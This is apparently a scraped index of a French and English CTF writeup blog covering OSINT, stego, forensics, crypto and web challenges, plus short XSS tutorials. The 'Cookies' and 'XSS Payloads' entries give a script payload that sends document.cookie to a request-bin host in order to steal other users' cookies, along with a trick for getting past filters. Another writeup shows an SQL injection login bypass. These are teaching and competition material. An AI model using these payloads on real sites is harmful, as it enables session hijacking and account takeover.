Pwned"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nDescription: My friend is spending good time in vacation but he doesn\u0026rsquo;t want to come back or telling me where he is ! The only thing I\u0026rsquo;ve got is one of his username : dtcvf2023. Can you find his flight number and the immatriculation of the plane he took ? I want to join him\u0026hellip;. flag format : dvCTF{immat_numVol} ex : dvCTF{5Y-KZG_KQA115}\nType: Osint\nWriteup partiel\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ La seule chose que nous avons,est un pseudo, et grâce à Sherlock,nous pouvons y voir qu\u0026rsquo;il existe un utilisateur sur instagram au nom de dtcvf2023:\nEt en arrivant sur le compte,nous trouvons 2 éléments interessants: Un lien google drive vers une photoUn post instagram\nSur le post,nous pouvons y voir l\u0026rsquo;heure: 00:59 heure LOCALE, et quelque chose d\u0026rsquo;écrit: ketibaan \u0026ndash;\u0026gt; Arrivé,c\u0026rsquo;est du malaisien, et en \u0026ldquo;reversant\u0026rdquo; l\u0026rsquo;image avec google image,nous pouvons y trouver l\u0026rsquo;aéroport:\nC\u0026rsquo;est donc une arrivée à l\u0026rsquo;aéroport de Sinagapour: Changi. Et en allant sur le google drive,nous pouvons y voir 1 image:\nEt en faisant quelques petites recherches,la companie aérienne est Iberia Líneas Aéreas de España:\nNous avons donc: -Aéroport d\u0026rsquo;arrivée: -Companie aérienne -Heure Locale (UTC+8)\nEn regardant les métadata de l\u0026rsquo;image,nous pouvons y voir des coordonnées:\nEt en recherchant nous obtenons une position:\n![[Capture d’écran 2023-03-12 102547.png]] Etant donné,que le post date d\u0026rsquo;il y a 5 jours,et que nous sommes le 12/03/2023,cela veut dire que le trajet a eu lei le 07/03/2023,or il est à l\u0026rsquo;aéroport à environ 1h du matin le 07/03, et que le pays est en UTC+8,cela veut sire qu\u0026rsquo;il est à l\u0026rsquo;aéroport le: 06/03/2023 à 17h UTC, nous essayons alors d\u0026rsquo;analyser le trafif dans l\u0026rsquo;après midi du 6 grâce à flight radar,en remontant,et c\u0026rsquo;est la que je bloque,je ne trouve aucun avion de Iberia Líneas Aéreas de España, qui y passe par ce point\u0026hellip; Nous sommes resté pas mal de temps dessus et n\u0026rsquo;avons pas trouvé malheuresement\u0026hellip;\n","permalink":"https://artyeth06.github.io/secret_plane/","summary":"Writeup partiel (non flag) du challenge Secret Plane issu du CTF Davinci CTF (présentiel)","title":"Secret Plane"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nDescription: I don\u0026rsquo;t remember where I did my reservation \u0026hellip; Give me the exact address of the nearest agency.\nType: Osint\nFlag format : dvCTF{[streetnumber]_[street_name]}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nNous pouvons essayer de reverse l\u0026rsquo;image grâce à Google Image:\nEt nous voyons qu\u0026rsquo;il y a une adresse Leboncoin semblable.\nEt en visitant la page, nous pouvons y voir une adresse (j\u0026rsquo;ai bien galéré mais c\u0026rsquo;était l\u0026rsquo;adresse sur laquelle j\u0026rsquo;étais,au bout de quelques heures les admins m\u0026rsquo;ont auguillés)![[Capture d’écran 2023-03-11 234728.png]] Ainsi la bonne adresse est l'allée des Fleurs F1 au cap Esterel\n","permalink":"https://artyeth06.github.io/the_agency/","summary":"Writeup du challenge The Agency issu du CTF Davinci CTF (présentiel)","title":"The Agency"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nDescription: Les choix random ne le sont pas autant que l\u0026rsquo;ont croit\nLevel:\nType: Programmation ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nNous avons un programme python, qui tire un nombre aléatoire\n#!/usr/bin/env python3 # Le principe du challenge est d\u0026#39;utiliser la génération aléatoire qui a une graine prévisible (le temps) pour prévoir le nombre en avance import time import random import datetime FLAG = \u0026#34;HDCTF{FAKE FLAG1}\u0026#34; scoreboard = \u0026#34;\u0026#34;\u0026#34; Tableau des scores (plus le score est petit, mieux c\u0026#39;est): Helyosis - 2 Max - 7 AAAAA - 8 Hexagons - 10 Joe - 12 Alfred - 42 \u0026#34;\u0026#34;\u0026#34; seed = int(time.time()) date = datetime.datetime.utcfromtimestamp(seed) random.seed(seed) print(f\u0026#34;Il est {date}.\u0026#34;) print(\u0026#34;Il est temps de jouer à un jeu !\u0026#34;) print(\u0026#34;Je vais penser à un nombre aléatoire entre 1 et 1 000 000 000 (inclus), essaie de trouver le plus vite possible :P\u0026#34;) print(scoreboard) number = random.randint(1, 1000000000) for _ in range(5): time.sleep(1) print(\u0026#34;.\u0026#34;, end = \u0026#34;\u0026#34;, flush=True) print() print(\u0026#34;J\u0026#39;ai trouvé mon nombre ! A toi de trouver\u0026#34;) nb_guess = 0 while True: guess = int(input(\u0026#34;\u0026gt; \u0026#34;)) nb_guess += 1 if guess == number: break if guess \u0026lt; number: print(\u0026#34;Mon nombre est supérieur.\u0026#34;) if guess \u0026gt; number: print(\u0026#34;Mon nombre est inférieur.\u0026#34;) assert guess == number print(f\u0026#34;Bien joué ! C\u0026#39;était bien {number}, tu as trouvé en {nb_guess} essai{\u0026#39;s\u0026#39; if nb_guess \u0026gt; 0 else \u0026#39;\u0026#39;}.\u0026#34;) if nb_guess \u0026gt; 1: print(\u0026#34;C\u0026#39;est un bon nombre d\u0026#39;essais mais tu peux faire mieux ! Essaie d\u0026#39;être le premier sur le tableau des scores !\u0026#34;) else: print(\u0026#34;Tu as trouvé le nombre en un nombre impressionnant d\u0026#39;essais\u0026#34;) print(FLAG) Nous pouvons voir,que la seed avec laquelle le nombre aléatoire est généré est en fonction de la date,nous avons juste à lancer le programme,et il nous donne la date exacte de quand on a lancé le programme python,ainsi,la seed est le timestamp de la date: Récupérons alors la date: ![[Capture d’écran (838).png]]\nJe vais la convertir en timestamp avec https://www.epochconverter.com/:\n![[Capture d’écran (839).png]]\n1677179233 Maintenant je vais modifier le scriptpour me donner le nombre aléatoire mais avec comme seed le timestamp obtenu précédemment:\nseed = 1677179233 date = datetime.datetime.utcfromtimestamp(seed) random.seed(seed) print(f\u0026#34;Il est {date}.\u0026#34;) print(\u0026#34;Il est temps de jouer à un jeu !\u0026#34;) print(\u0026#34;Je vais penser à un nombre aléatoire entre 1 et 1 000 000 000 (inclus), essaie de trouver le plus vite possible :P\u0026#34;) print(scoreboard) number = random.randint(1, 1000000000) print(number) `416980398` Voici le nombre que l\u0026rsquo;on devait trouvé,maintenant essayons le:\nEt c\u0026rsquo;est bien ca ! (Note: c\u0026rsquo;est un fake flag car le nc n\u0026rsquo;est plus dispo\u0026hellip;)\n","permalink":"https://artyeth06.github.io/guess_my_number1/","summary":"Writeup du challenge Guess My Number 1 issu du CTF HDFR x Kraken","title":"Guess My number 1"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nDescription: Un avion est détourné et avec un audio on doit retrouver quelle ville ils survolent\nLevel:\nType: Stegano\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nNous avons un audio,avec des bruits de moteur et des bips,qui est enfait un message en morse,que nous allons pouvoir analyser avec:https://morsecode.world/international/decoder/audio-decoder-adaptive.html\nEt en analysant,nous obtenons: ....- ---.. .-.-.- .---- ...-- --... .---- ...-- --... .---- ..... ....- --..-- .---- .---- .-.-.- ..... --... -.... .---- ..--- ....-, et en le décodant avec crypto tool: https://github.com/ArtyETH06/crypto_tool Nous obtenons des coordonnées: 48.137137154,11.576124\nEt en recherchant sur Google map,nous sommes au dessus de Munich !\n","permalink":"https://artyeth06.github.io/Houston_do_you_copy/","summary":"Writeup du challenge Guess Houston do you copy issu du CTF HDFR x Kraken","title":"Houston do you copy"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nDescription:\nLevel:\nType: Osint\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nNous devons retrouver le nom de cette île\u0026hellip; Cette fois-ci,grâce à https://tineye.com/,j\u0026rsquo;ai pu trouver des vidéos en rapport avec l\u0026rsquo;image,et en regardant,il est marque Drapeau et animation de la carte de Trinité-Tabago\nEn recherchant les îles trinité Tobago,nous pouvons y trouver les îles,ainsi que celle que nous recherchons:\nEt nous pouvons trouver l\u0026rsquo;îles: Granade\n","permalink":"https://artyeth06.github.io/Pirates__1_sur_2/","summary":"Writeup du challenge Guess Pirates (1 sur 2) issu du CTF HDFR x Kraken","title":"Pirates (1 sur 2)"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nDescription: En gros il y a eu un transfert d\u0026rsquo;un jpg entre ordi et clé USB mais clé USB tombé dans café donc on doit retrouver l\u0026rsquo;image x)\nLevel:\nType: Forensic\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nA ce challenge est associé un .pcap,nous l\u0026rsquo;ouvrons avec wireshark,et pouvons voir les échanges entre l\u0026rsquo;ordi et la clé USB,en cherchant,j\u0026rsquo;ai trouvé un paquet de length 65 563, ce qui est énorme (+ gros paquet du .pcap),donc on peut supposer que l\u0026rsquo;image est transférée ici.\nNous pouvons essayer de copier le dump hexadécimal, il fait 4000 lignez donc je ne le met pas mais pour récapituler il y a beaucoup de nombres et de lettre (c\u0026rsquo;est de l\u0026rsquo;hexa logique x)). Nous pouvons essayer de rétablir l\u0026rsquo;image avec https://gchq.github.io/CyberChef/#recipe=From_Hexdump() pour reconstituer le dump hexa:\nNous pouvons essayer de sauvegarder l\u0026rsquo;image sous un .jpg:\nEt nous obtenons le flag !\n","permalink":"https://artyeth06.github.io/USB_transfert/","summary":"Writeup du challenge Guess USB-Transfert issu du CTF HDFR x Kraken","title":"USB-transfert"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nDescription:\nLevel:\nType: Osint\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nRepérer le pays Nous avons une photo qui a été prise devant un parc d\u0026rsquo;attraction,en regardant avec google image nous pouvons nous apercevoir que les écritures sont enfait du mongole.\nNous pouvons donc penser que le parc se trouve en Mongolie\nTrouver le parc Il est dit que c\u0026rsquo;est un des plus connu de son pays,je fais donc des recherches et tombe sur une page intéressant:\nje fais donc des recherches\u0026hellip;Je regarde sur google Earth\u0026hellip;Et nous pouvons voir que sur le fond de la photo,nous pouvons apeçevoir une grande roue\nEt en regardant le parc sur google earth,nous pouvons y voir une grande roue\u0026hellip;\nMais pour en être sur,j\u0026rsquo;ai retrouvé l\u0026rsquo;endroit exact d\u0026rsquo;ou a été prise la photo:\nC\u0026rsquo;est donc le bon parc et il s\u0026rsquo;appelle National Amusement Parc en Mongolie !\n","permalink":"https://artyeth06.github.io/Where_am_I_1/","summary":"Writeup du challenge Guess Where am I 1 issu du CTF HDFR x Kraken","title":"Where am I 1"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nDescription:\nLevel:\nType: Osint\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nNous pouvons y voir,sur cette photo,une Tour Eiffel,mais pas \u0026rsquo;la vrai\u0026rsquo;,et nous devons trouver où a été prise cette photo,rien de mieux que google image pour du reverse d'image.Et avec google image nous avons directement une reconnaissance,ils ont prit une photo de google,ainsi nous pouvons trouver la même sur le web !\nEt en fouillant un peu,cette image a été prise près de Saint-Georges-des-Gardes\n","permalink":"https://artyeth06.github.io/Where_am_I_2/","summary":"Writeup du challenge Guess Where am I 2 issu du CTF HDFR x Kraken","title":"Where am I 2"},{"content":"Liste de TOUS les CTF -Root-me 10k members\n-SecurityValley - always on CTF\n-AM cyber CTF\n-Glacier CTF\n-Kit CTF\n-INTENT CTF 2022\n-NahamCon EU CTF 2022\n-Ping CTF\n-TetCTF 2023\n-irisCTF2023\n-KnightCTF 2023\n-HexaOsintCTF 2023 (Avec équipe EPITA HDFR)\n-Kraken CTF (Kraken x HDFR)\n-Davinci CTF (Présentiel)\n-Cyber Apocalypse 2023 - The Cursed Mission\n-FCSC 2023\n-PwnMe CTF 2023\nCTF Root-me 10k membres Root-me 10k members (21/10/2022)\nElu meilleur Writeup pour la catégorie Intro, avec le Writeup de Secured Front!\nSecurityValley - always on CTF SecurityValley - always on CTF (31/10/2022)\nCTF Ekoparty CTF Ekoparty (3/11/2022)\nAM cyber AM cyber CTF (17/11/2022)\nGlacier CTF Glacier CTF(26/11/2022)\nKit CTF Kit CTF(10/12/2022)\nINTENT CTF 2022 INTENT CTF 2022(14/12/2022)\nNahamCon EU CTF 2022 NahamCon EU CTF 2022 (17/12/2022)\nPing CTF Ping CTF(28/12/2022)\nNiteCTF 2022 NiteCTF 2022 (24/12/2022)\nTetCTF 2023 TetCTF 2023(01/01/2023)\nirisCTF2023 irisCTF2023(07/01/2023)\nKnightCTF 2023 KnightCTF 2023\nHexaOsintCTF 2023 HexaOsintCTF 2023 (28-27/01/2023) Le sommeil ? jamais entendu parler\u0026hellip; Durant ce CTF,je n\u0026rsquo;ai pas beaucoup flag,mais j\u0026rsquo;ai pas mal aidé mes coéquipiers dans leurs diverses tâches\u0026hellip;!\nKraken CTF (Kraken x HDFR) Kraken CTF (Kraken x HDFR)(23/02/2022)\nDavinci CTF (Présentiel) Davinci CTF (Présentiel) (11/03/2023) Résultats présentiels: 6e sur 17\nCyber Apocalypse 2023 - The Cursed Mission Cyber Apocalypse 2023 - The Cursed Mission(20/03/2023)\nFCSC 2023 FCSC 2023 (23/04/2023-30/04/2023)\n66e catégorie Junior\nPwnMe CTF 2023 PwnMe CTF 2023(05/05/2023-07/05/2023)\n","permalink":"https://artyeth06.github.io/all_time/","summary":"All the CTF i’ve done !","title":"All Time CTF"},{"content":"Whoami❓ Ethical hacker👨🏻‍💻, developper💻, trader📈 💻Im a developper (HTML/CSS/Javascript/Python/solidity)\n👨‍🎓Im currently learning Ocaml,C, and ASM programming languages,just discovered Reverse engineering,and love it !\n📈In finance since 5 years old, mostly in crypto📈 (pretty good trader ;),same as my quote is \u0026ldquo;Hodl and prosper\u0026rdquo;)\n🚀Im 16 years old and grinding for my dream school\nRoot-me: root-me.org/Arty06\n\u0026ldquo;Work hard, hack harder\u0026rdquo;, \u0026ldquo;La root est longue,mais la voie est libre\u0026hellip;\u0026rdquo;\nfrom Arty06 import * def show_my_skills(): skill = [\u0026#34;HTML\u0026#34;,\u0026#34;CSS\u0026#34;,\u0026#34;Javascripts\u0026#34;,\u0026#34;Python\u0026#34;,\u0026#34;Solidity\u0026#34;] for i in range(len(skill)): print(\u0026#34;Hey,i do manage\u0026#34;, skill[i]) learning = [\u0026#34;Ocaml\u0026#34;,\u0026#34;ASM\u0026#34;,\u0026#34;C\u0026#34;,\u0026#34;PHP\u0026#34;] for i in range(len(learning)): print(\u0026#34;Hey,im currently learning\u0026#34;, learning[i]) show_my_skills() My Skill Set 👨‍💻 Frontend Backend Connect with me 📱 ","permalink":"https://artyeth06.github.io/about/","summary":"Whoami❓ Ethical hacker👨🏻‍💻, developper💻, trader📈 💻Im a developper (HTML/CSS/Javascript/Python/solidity)\n👨‍🎓Im currently learning Ocaml,C, and ASM programming languages,just discovered Reverse engineering,and love it !\n📈In finance since 5 years old, mostly in crypto📈 (pretty good trader ;),same as my quote is \u0026ldquo;Hodl and prosper\u0026rdquo;)\n🚀Im 16 years old and grinding for my dream school\nRoot-me: root-me.org/Arty06\n\u0026ldquo;Work hard, hack harder\u0026rdquo;, \u0026ldquo;La root est longue,mais la voie est libre\u0026hellip;\u0026rdquo;\nfrom Arty06 import * def show_my_skills(): skill = [\u0026#34;HTML\u0026#34;,\u0026#34;CSS\u0026#34;,\u0026#34;Javascripts\u0026#34;,\u0026#34;Python\u0026#34;,\u0026#34;Solidity\u0026#34;] for i in range(len(skill)): print(\u0026#34;Hey,i do manage\u0026#34;, skill[i]) learning = [\u0026#34;Ocaml\u0026#34;,\u0026#34;ASM\u0026#34;,\u0026#34;C\u0026#34;,\u0026#34;PHP\u0026#34;] for i in range(len(learning)): print(\u0026#34;Hey,im currently learning\u0026#34;, learning[i]) show_my_skills() My Skill Set 👨‍💻 Frontend Backend Connect with me 📱 ","title":"About"},{"content":"have you ever asked, how can i get admin cookies ? You are at the right place ;)\nFirst of all,make sure that you can make a XSS injection (I redirect you to a blog from Ruulian: https://0xhorizon.eu/cheat-sheet/xss/) This is a very good blog to learn XSS injections + payload\nGet Admin Cookies Get A Request Bin First of all,you\u0026rsquo;ll need a request bin,wich will be use as your endpoint. You can get one here \u0026ndash;\u0026gt; https://requestinspector.com/\nThe Payload Once you have your endpoint (should look like this: https://requestinspector.com/p/xxxxxxxxxxxxxxxxxxxxxxxxxx) We need to create a payload to inject:\n\u0026lt;script\u0026gt;document.location=\u0026#39;REQUESTBINLink?cookie=\u0026#39;+document.cookie\u0026lt;/script\u0026gt; Get the Cookies Once you have injected the malicious payload,go to your request bin page,and wait for the event,then,you\u0026rsquo;ll be able to steal other users cookies !\n","permalink":"https://artyeth06.github.io/Cookies/","summary":"have you ever asked, how can i get admin cookies ? You are at the right place ;)\nFirst of all,make sure that you can make a XSS injection (I redirect you to a blog from Ruulian: https://0xhorizon.eu/cheat-sheet/xss/) This is a very good blog to learn XSS injections + payload\nGet Admin Cookies Get A Request Bin First of all,you\u0026rsquo;ll need a request bin,wich will be use as your endpoint. You can get one here \u0026ndash;\u0026gt; https://requestinspector.","title":"Cookies"},{"content":"here im gonna present you some XSS payloads,if you want to learn what is a XSS injection,go and check out Ruulian work \u0026ndash;\u0026gt; https://0xhorizon.eu/articles/xss/\nBasic Payloads: \u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; \u0026lt;Svg OnLoad=alert(1)\u0026gt; \u0026lt;img src=\u0026#34;\u0026#34; onerror=\u0026#34;alert()\u0026#34;\u0026gt; Bypass common filter Bypass http/https filter Change your Payload like this:\n- \u0026lt;script\u0026gt;document.location=\u0026#39;\u0026lt;https://requestinspector.com/p/xxxxxxxxxxxxxxxxxxxxxxxxxx?cookie=\u0026#39;+document.cookie\u0026gt;\u0026lt;/script\u0026gt; + \u0026lt;script\u0026gt;document.location=\u0026#39;//requestinspector.com/p/xxxxxxxxxxxxxxxxxxxxxxxxxx?cookie=\u0026#39;+document.cookie\u0026lt;/script\u0026gt; Some Payloads \u0026#39;-alert(1)-\u0026#39; \u0026#39;-alert(1)// ","permalink":"https://artyeth06.github.io/XSS_Payloads/","summary":"here im gonna present you some XSS payloads,if you want to learn what is a XSS injection,go and check out Ruulian work \u0026ndash;\u0026gt; https://0xhorizon.eu/articles/xss/\nBasic Payloads: \u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; \u0026lt;Svg OnLoad=alert(1)\u0026gt; \u0026lt;img src=\u0026#34;\u0026#34; onerror=\u0026#34;alert()\u0026#34;\u0026gt; Bypass common filter Bypass http/https filter Change your Payload like this:\n- \u0026lt;script\u0026gt;document.location=\u0026#39;\u0026lt;https://requestinspector.com/p/xxxxxxxxxxxxxxxxxxxxxxxxxx?cookie=\u0026#39;+document.cookie\u0026gt;\u0026lt;/script\u0026gt; + \u0026lt;script\u0026gt;document.location=\u0026#39;//requestinspector.com/p/xxxxxxxxxxxxxxxxxxxxxxxxxx?cookie=\u0026#39;+document.cookie\u0026lt;/script\u0026gt; Some Payloads \u0026#39;-alert(1)-\u0026#39; \u0026#39;-alert(1)// ","title":"XSS Payloads"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nDescription: Can you GET the \u0026lsquo;flag\u0026rsquo; ?\nLevel: Easy\nType: Web ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ lors,ce challenge m\u0026rsquo;avais tout de suite orienté vers de fausse piste (chercher un flag.txt avec la GET method, ou encore modifier l\u0026rsquo;url /flag/get\u0026hellip;)\nMais au final,c\u0026rsquo;était tout simple il ne fallait pas passer par la méthode\nGET\n, mais la méthode\nFLAG\n,nous pouvons faire ça avec\nBurp suite\n:\nAu début nous avons juste hii :), mais quand nous mettons la méthode FLAG:\n","permalink":"https://artyeth06.github.io/easy1/","summary":"Writeup du challenge Easy1 issu du CTF Ping CTF 2022","title":"Easy1"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nDescription: Get admin control in the website somehow\nLevel: Easy\nType: Web ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nCe challenge nous redirige vers une page de login,nous devons nous authentifier en tant que\nadmin , nous pouvons donc effectuer une injection SQL:\n\u0026#39; or 1=1-- , et nous somme redirigé avec une page et un bouton pour get le flag\n","permalink":"https://artyeth06.github.io/4dm1n_c0ntR0L/","summary":"Writeup du challenge 4dm1n_c0ntR0L issu du CTF niteCTF 2022","title":"4dm1n_c0ntR0L"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nDescription: What is the rgb(19,55,175) color in its hexadecimal representation?\nType: Warmup\nLevel: Easy ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nCe challenge nous demande de trouver la représentation en hexadécimal de:\n19,55,175 , nous avons juste à aller sur un site comme\nhttps://www.rgbtohex.net/\n, permettant la conversion de RGB \u0026ndash;\u0026gt; Hex:\nEt nous obtenons le code: #1337AF !\n","permalink":"https://artyeth06.github.io/Arjeebee/","summary":"Writeup du challenge Arjeebee issu du CTF NahamCon EU CTF 2022","title":"Arjeebee"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nDescription: Hey kids!! Wanna learn how to hack??!?! Start here to foster your curiosity!\nType: Warmup\nLevel:\nEasy\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nQuand nous démarrons le challenge,nous avons accès à une commande pour nous connecter sur un serveur:\nEn se renseignant sur le sujet,\nHeartbleed\nest une \u0026ldquo;méthode\u0026rdquo; qui,va faire un lien entre le serveur et l\u0026rsquo;utilisateur en lui demandnant un mot et la longueur du mot,or nous pouvons provoquer un\noverflow\nen mettant plus de caractère que nécéssaires,ce qui va faire appraître le flag:\n","permalink":"https://artyeth06.github.io/Baby_First_Heartbleed/","summary":"Writeup du challenge Baby\u0026rsquo;s First Heartbleed issu du CTF NahamCon EU CTF 2022","title":"Baby's First Heartbleed"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nDescription: Do you know what the cat command does in the Linux command-line?\nType: Warmup\nLevel: Easy ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ Nous avons un fichier donné,auquel nous pouvons rajouter l\u0026rsquo;extension .txt.Pour ce challenge, il y aavait 2 méthodes plutôt similaire:\nOuvrir le fichier Nous pouvons tout simplement ouvrir le fichier et y voir le flag:\nOu la 2 ème méthode:\nSuivre la consigne En effet,la consigne nous suggère s\u0026rsquo;utiliser la commande\ncat (permetant de voir le contenu du fichier), et nous pouvons y voir également le flag:\n","permalink":"https://artyeth06.github.io/catscii/","summary":"Writeup du challenge catscii issu du CTF NahamCon EU CTF 2022","title":"catscii"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nDescription: Below is a SHA256 hash! Can you determine what the original data was, before it was hashes?\nType: Warmup\nLevel: Easy ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nCe challenge nous donne une string encodée avec Sha256: 705db0603fd5431451dab1171b964b4bd575e2230f40f4c300d70df6e65f5f1c Nous avons juste à la décoder avec un Sha256 decoder comme: https://www.dcode.fr/hash-sha256:\nLe flag est ainsi trouvé !\n","permalink":"https://artyeth06.github.io/Hashstation/","summary":"Writeup du challenge Hashstation issu du CTF NahamCon EU CTF 2022","title":"Hashstation"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nDescription: Please follow the rules for this CTF!\nType: Warmup\nLevel: Easy ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nCe challenge nous propose d\u0026rsquo;aller lire les règles du CTF,en suivant le lien sous sommes sur:\nIl est précisé que sur cette page se trouve le\nflag\n, et en jettant un coup d\u0026rsquo;oeil dans les outils de développeur nous pouvons y trouver le flag !\n","permalink":"https://artyeth06.github.io/Read_The_Rules/","summary":"Writeup du challenge Read The Rules issu du CTF NahamCon EU CTF 2022","title":"Read The Rules"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nDescription: Here is some data represented in base 2. What is this data represented as ASCII text?\nType: Warmup\nLevel: Easy ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nCe challenge nosu demande de convertir des données en base 2 (binaire), en ASCII,voici la chaine de carcatère encodée en base 2: 01100110 01101100 01100001 01100111 01111011 00111001 00110000 01100011 00110110 01100101 01100010 01100101 00111001 00110100 00110001 00110101 00110110 00110001 01100011 01100110 01100001 01100100 01100110 01100001 01100101 00110001 00110111 00110000 01100001 00111000 01100110 00110000 01100101 01100001 00110010 00110101 00110010 01111101\nPour décoder cette chaine de caractère nous pouvons nous rendre sur: https://gchq.github.io/CyberChef/#recipe=From_Binary(\u0026lsquo;Space\u0026rsquo;,8) Puis nous mettons le code en binaire et il nous renvoie le flag !\n","permalink":"https://artyeth06.github.io/Way_2_Basic/","summary":"Writeup du challenge Way 2 Basic issu du CTF NahamCon EU CTF 2022","title":"Way 2 Basic"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nDescription: We have captured a message. But what is the content??? Help us, please!\nLevel: Level 1\nType: Crypto ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nSo, the encoded message look like this:\nSo we are going to try ervery\nRotchar\npossibility (we are going straight to rotchar because text who look like this are often encode in rotchar): And with the\nRotchar 26 ,we cann see a text with the flag !\nThe flag is: SecVal{thisjulius}!\n","permalink":"https://artyeth06.github.io/Capture_message/","summary":"Writeup du challenge Capture message","title":"Capture message"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nDescription: Hm hm hm. We have seen this before\u0026hellip; a long time ago. But we are to stupid to crack it\u0026hellip;help us, again! I guess the original content of this weird garbage is english. Maybe that help\u0026rsquo;s you to break it!\nLevel: Level 1\nType: Crypto ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nSo we got a beautifull encoded message,we are gonna see what encode method is use,and after some times we found that the encode method is:\nSubstitution Mono-alphabétique Once we decode the message,we got a beautifull story with the flag (that we need to format)\nILIKELEWISCARROLL\n.If you dont want to type it in lowercase,juste use this website ━━\u0026gt;\nhttps://convertcase.net/fr/\n, it will give us this:\nilikelewiscarroll So,the flag is SecVal{ilikelewiscarroll} !\n","permalink":"https://artyeth06.github.io/Capture_message_(2)/","summary":"Writeup du challenge Capture message (2)","title":"Capture message (2)"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nDescription: Let\u0026rsquo;s start simple in this game. We have collected a piece of javascript. There is a validate function but we don\u0026rsquo;t know the password\u0026hellip; can you hack it?\nLevel: Level 1\nType: Coding ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nThe only thing that we have is a javascript code:\nconst readline = require(\u0026#39;readline\u0026#39;).createInterface({ input: process.stdin, output: process.stdout }); readline.question(\u0026#39;Please enter password \\\\n\u0026#39;, password =\u0026gt; { console.log(`Gonna check if ${password} is correct`); readline.close(); validate(password) }); function validate(password) { const pass = [106,117,115,116,95,119,97,114,109,105,110,103,95,117,112]; const pa = Array.from(password); for(let i = 0; i \u0026lt; pa.length; i++) { if(pa[i].charCodeAt(0) !== pass[i]) { throw new Error(\u0026#34;pass violation. wrong credentials\u0026#34;); } } banner(password); } function banner(payload) { console.info(\u0026#34;that was great !!!\u0026#34;); console.info(\u0026#34;run the following command to get the flag.\u0026#34;) console.info(`curl -X POST \u0026lt;http://ctf.securityvalley.org:7777/api/v1/validate\u0026gt; -H \u0026#39;Content-Type: application/json\u0026#39; -d \u0026#39;{\u0026#34;pass\u0026#34;: \u0026#34;${payload}\u0026#34;}\u0026#39;`) } We can already see that the pass is encode in\ncharcode : and the decoded password is:\njust_warming_up .Then,in the code, it tells us to run a certain command to get the flag ! But we need to replace\n${payload} with the password,wich give us:\ncurl -X POST \u0026lt;http://ctf.securityvalley.org:7777/api/v1/validate\u0026gt; -H \u0026#39;Content-Type: application/json\u0026#39; -d \u0026#39;{\u0026#34;pass\u0026#34;: \u0026#34;just_warming_up\u0026#34;}\u0026#39; And by entering this command,we get the flag !\nThe flag is: SecVal{J4v45Cr1P7_15_57r4444N93} !\n","permalink":"https://artyeth06.github.io/Easy_authentication/","summary":"Writeup du challenge Easy authentication","title":"Easy authentication"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nDescription: After your first strike, the development team has increased the power of there login function. Are you strong enough to break it again?\nLevel: Level 1\nType: Coding ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nSo we got an authentification js code,a bit harder thant the 1st one:\nconst readline = require(\u0026#39;readline\u0026#39;).createInterface({ input: process.stdin, output: process.stdout }); readline.question(\u0026#39;Please enter password \\\\n\u0026#39;, password =\u0026gt; { console.log(`Gonna check if ${password} is correct`); readline.close(); validate(password) }); function validate(password) { if (password.length != 12) { throw new Error(\u0026#34;pass violation. wrong password length\u0026#34;); } const block1 = 